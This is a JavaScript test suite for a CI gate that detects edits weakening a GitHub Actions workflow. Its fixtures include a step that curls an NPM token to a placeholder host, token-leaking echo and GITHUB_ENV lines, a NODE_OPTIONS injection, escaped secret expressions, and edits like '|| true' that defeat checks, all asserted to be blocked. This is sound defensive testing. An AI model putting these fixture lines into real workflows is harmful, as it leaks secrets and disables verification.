import assert from 'node:assert/strict';
import { test } from 'node:test';
import { gate } from '../src/gate.js';
import { parseWorkflow, workflowWeakened } from '../src/workflow.js';
import { commit, fixtureConfig, fixtureRepo } from './helpers.js';

const COMMANDS = ['npm run lint', 'npm test'];
const weakened = (base, head, commands = COMMANDS) => workflowWeakened(base, head, commands);

const BASE = `name: quality
on:
  pull_request:
  push:
    branches: [main]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run lint # the lint gate
  test:
    name: Unit tests
    needs: lint
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Test
        run: |
          npm ci
          npm test
        env:
          CI: 'true'
`;

/** BASE with `from` replaced by `to` (the replacement must happen). */
const edit = (from, to) => {
  assert.ok(BASE.includes(from), from);
  return BASE.replace(from, to);
};

test('REQ-GATE-43 the subset parser reads workflow structure: maps, step lists, flow lists, block scalars', () => {
  const w = parseWorkflow(BASE);
  const jobs = w.get('jobs');
  assert.deepEqual([...jobs.keys()], ['lint', 'test']);
  assert.equal(jobs.get('lint').get('steps').length, 3);
  assert.equal(jobs.get('lint').get('steps')[2].get('run'), 'p:npm run lint');
  assert.equal(jobs.get('test').get('steps')[1].get('run'), 'b|:npm ci\nnpm test');
  assert.deepEqual(w.get('on').get('push').get('branches'), ['p:main']);
  assert.equal(w.get('on').get('pull_request'), null);
});

test('REQ-GATE-43 appended run steps and comments keep every base check', () => {
  assert.equal(weakened(BASE, `${BASE}      - run: npm run audit\n`), null);
  assert.equal(weakened(BASE, `${BASE}      - name: Audit\n        run: |\n          npm audit\n        shell: bash\n`), null);
  assert.equal(weakened(BASE, `# quality gate\n${BASE}`), null);
  assert.equal(weakened(BASE, edit('      - run: npm ci\n', '      - run: npm ci   # install\n')), null);
});

test('REQ-GATE-43 an added step that reads secrets, calls an action, or sets env, with, or permissions stays locked', () => {
  const add = (step) => weakened(BASE, `${BASE}${step}`);
  assert.match(add('      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://x.example\n'), /added step 3 of job test.*expression/);
  assert.match(add('      - run: echo ${{ github.token }}\n'), /expression/);
  assert.match(add('      - uses: some/action@v1\n'), /not a run step/);
  assert.match(add('      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: x\n'), /sets env/);
  assert.match(add('      - run: x\n        continue-on-error: true\n'), /sets continue-on-error/);
  assert.match(
    weakened(BASE, edit('    needs: lint\n', '    needs: lint\n    permissions:\n      contents: write\n')),
    /job test: adds permissions/,
  );
});

test('REQ-GATE-43 a removed, changed, or reordered step stays locked, even when a step is added to hide it', () => {
  const sneaky = edit('      - run: npm run lint # the lint gate\n', '      - run: npm run format\n');
  assert.match(weakened(BASE, sneaky), /step 3 of job lint/);
  assert.match(weakened(BASE, edit('          npm test\n', '          npm test || true\n')), /step 2 of job test/);
  assert.match(weakened(BASE, edit('      - run: npm ci\n', '      - run: echo hi\n      - run: npm ci\n')), /step 2 of job lint/);
  assert.match(
    weakened(BASE, edit("          CI: 'true'\n", "          CI: 'true'\n        continue-on-error: true\n")),
    /step 2 of job test/,
  );
  assert.match(weakened(BASE, edit("          CI: 'true'\n", '          CI: true\n')), /step 2 of job test/);
});

test('REQ-GATE-43 a renamed job, a removed needs, a changed if, or a new job key stays locked', () => {
  assert.match(weakened(BASE, edit('  test:\n', '  tests:\n')), /removes job test/);
  assert.match(weakened(BASE, edit('    needs: lint\n', '')), /job test.*needs/);
  assert.match(weakened(BASE, edit("    if: github.event_name == 'pull_request'\n", '    if: false\n')), /job test.*if/);
  assert.match(weakened(BASE, edit('    needs: lint\n', '    needs: lint\n    continue-on-error: true\n')), /job test.*continue-on-error/);
  assert.match(
    workflowWeakened(
      BASE,
      edit(
        '    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name',
        '    runs-on: self-hosted\n    steps:\n      - uses: actions/checkout@v4\n      - name',
      ),
    ),
    /job test.*runs-on/,
  );
  assert.match(weakened(BASE, edit('    name: Unit tests\n', '    name: Unit\n')), /job test.*name/);
});

test('REQ-GATE-43 a step added to a job that runs no configured command, or that has secrets, an environment, or write permissions, stays locked', () => {
  const add = (base) => weakened(base, `${base}      - run: npm run audit\n`);
  assert.match(weakened(BASE, `${BASE}      - run: npm run audit\n`, ['make check']), /runs no configured/);
  const deploy = BASE.replace('          npm test\n', '          npm test\n          ./deploy.sh\n');
  assert.equal(add(deploy), null);
  assert.match(add(BASE.replace("          CI: 'true'\n", '          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n')), /expression/);
  assert.match(add(BASE.replace('jobs:\n', 'env:\n  T: ${{ github.token }}\njobs:\n')), /expression/);
  assert.match(add(BASE.replace('    needs: lint\n', "    needs: lint\n    env:\n      T: ${{ github['token'] }}\n")), /expression/);
  assert.match(
    add(BASE.replace('          npm test\n', '          npm test\n          echo "T=${{ github.Token }}" >> "$GITHUB_ENV"\n')),
    /expression/,
  );
  assert.match(add(BASE.replace('    needs: lint\n', '    needs: lint\n    environment: production\n')), /environment/);
  assert.match(add(BASE.replace('jobs:\n', 'permissions:\n  id-token: write\njobs:\n')), /write or id-token/);
  assert.match(add(BASE.replace('    needs: lint\n', '    needs: lint\n    permissions:\n      contents: write\n')), /write or id-token/);
  assert.equal(add(BASE.replace('jobs:\n', 'permissions:\n  contents: read\njobs:\n')), null);
});

test('REQ-GATE-43 workflow-level additions and any new job stay locked', () => {
  assert.match(weakened(BASE, edit('jobs:\n', 'env:\n  NODE_OPTIONS: --require ./x.js\njobs:\n')), /top-level env/);
  assert.match(weakened(BASE, edit('jobs:\n', 'permissions:\n  contents: write\njobs:\n')), /top-level permissions/);
  assert.match(weakened(BASE, edit('    branches: [main]\n', '    branches: [main, dev]\n')), /top-level on/);
  // A new job could report the name of a required check from this file, another workflow, or another app.
  const job = (head) => edit('  test:\n', `  fake:\n${head}    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n  test:\n`);
  assert.match(weakened(BASE, job('    name: Unit tests\n')), /adds job fake/);
  assert.match(weakened(BASE, job('    name: build\n')), /adds job fake/);
  assert.match(weakened(BASE, job('')), /required check name/);
});

test('REQ-GATE-43 YAML the subset parser cannot read fails closed', () => {
  for (const head of [
    edit('      - run: npm ci\n', '      - run: &i npm ci\n'),
    edit('      - run: npm ci\n', '      - run: *i\n'),
    edit('      - run: npm ci\n', '      - run: !!str npm ci\n'),
    edit('      - run: npm ci\n', '      - run: npm ci\n        more\n'),
    edit('    branches: [main]\n', '    branches: [main,\n      dev]\n'),
    edit('      - run: npm ci\n', '\t- run: npm ci\n'),
    edit('      - run: npm ci\n', '      - run: npm ci\n      - run: npm ci\n        run: twice\n'),
    `${BASE}---\nname: second\n`,
    edit("          CI: 'true'\n", '          CI: "\\x24{{ secrets.T }}"\n'),
    edit('      - run: npm ci\n', '      - run: "curl \\u0024{{ secrets.T }}"\n'),
    edit('    branches: [main]\n', '    branches: ["ma\\u0069n"]\n'),
    edit('      - run: npm ci\n', '      - "r\\u0075n": npm ci\n'),
  ])
    assert.match(weakened(BASE, head), /cannot parse/, head);
});

test('REQ-GATE-43 the gate allows a workflow edit only when the card names the file and the edit only adds', () => {
  const path = '.github/workflows/quality.yml';
  const config = fixtureConfig({ checks: {}, testCommand: 'npm test' });
  const card = (text) => ({ id: 'c1', kind: 'chore', size: 'S', paths: [], allowEdits: [], acceptance: [], heldOut: null, text });
  const named = card('# c1\n\nThe fix belongs in .github/workflows/quality.yml.\n');
  const { dir, base } = fixtureRepo({ [path]: BASE });

  commit(dir, { [path]: `${BASE}      - run: npm run audit\n` });
  const ok = gate({ repo: dir, base, card: named, config });
  assert.equal(ok.pass, true, JSON.stringify(ok.results));
  assert.deepEqual(ok.results.find((r) => r.name === 'locked').relaxed, [
    { path, rule: 'verification-file-changed', proof: 'workflow keeps every base job, step, needs, if, and check name' },
  ]);

  const unnamed = gate({ repo: dir, base, card: card('# c1\n\nFix CI.\n'), config });
  assert.equal(unnamed.pass, false);
  assert.equal(unnamed.results.find((r) => r.name === 'locked').problems[0].rule, 'verification-file-changed');

  // The card names it by file name alone.
  assert.equal(gate({ repo: dir, base, card: card('# c1\n\nEdit quality.yml to add an audit.\n'), config }).pass, true);

  commit(dir, { [path]: edit('      - run: npm run lint # the lint gate\n', '      - run: npm run lint || true\n') });
  const weakened = gate({ repo: dir, base, card: named, config });
  assert.equal(weakened.pass, false);
  const problem = weakened.results.find((r) => r.name === 'locked').problems[0];
  assert.equal(problem.rule, 'verification-file-changed');
  assert.match(problem.why, /step 3 of job lint/);
});
